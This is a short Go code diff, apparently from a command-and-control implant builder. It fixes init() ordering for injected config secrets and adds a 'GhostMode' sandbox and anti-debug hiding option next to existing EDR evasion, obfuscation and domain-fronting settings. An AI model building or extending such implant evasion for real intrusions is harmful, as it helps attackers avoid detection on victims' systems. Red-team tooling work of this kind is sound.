@@ -127,6 +127,12 @@ func buildLdflags(cfg ImplantConfig, profile MalleableProfile, goos string) (str
 // package init(). Delivering secrets via this temp source file (instead of the
 // go build argv) keeps them out of the build process command line (B2). The file
 // lives only inside the throwaway build directory and is removed with it.
+//
+// The filename must sort BEFORE agent.go: Go runs a package's init() functions
+// in source-file name order, and agent.go's init() calls loadConfigBlob() which
+// reads ConfigBlob/SConfigKey. A name like zz_config_inject.go would run last,
+// so the blob would still be empty when loadConfigBlob() executes and every
+// build would silently fall back to build-time defaults.
 func writeConfigInjectFile(workDir, configBlob, sConfigKey string) error {
 	if configBlob == "" && sConfigKey == "" {
 		return nil
@@ -139,7 +145,7 @@ func writeConfigInjectFile(workDir, configBlob, sConfigKey string) error {
 		src += "\tSConfigKey = " + strconv.Quote(sConfigKey) + "\n"
 	}
 	src += "}\n"
-	return os.WriteFile(filepath.Join(workDir, "zz_config_inject.go"), []byte(src), 0644)
+	return os.WriteFile(filepath.Join(workDir, "aa_config_inject.go"), []byte(src), 0644)
 }
 
 // selfCheckPlaceholder is the 64-'0' hex string injected at build time for the
@@ -647,6 +653,7 @@ type ImplantConfig struct {
 	MalleableRequestAppend  string
 	MalleableRequestHeaders map[string]string
 	Evasion                 bool   // Enable chunked sleep obfuscation (Windows EDR basics)
+	GhostMode               bool   // Enable ghost protocol (sandbox/anti-debug deep-hiding; opt-in, default off)
 	Obfuscate               bool   // Enable garble build-time obfuscation (string/literal hiding)
 	DomainFront             string // CDN front domain for domain fronting ("" = disabled)
 	Architecture            string // "amd64" (default), "arm64", "arm"
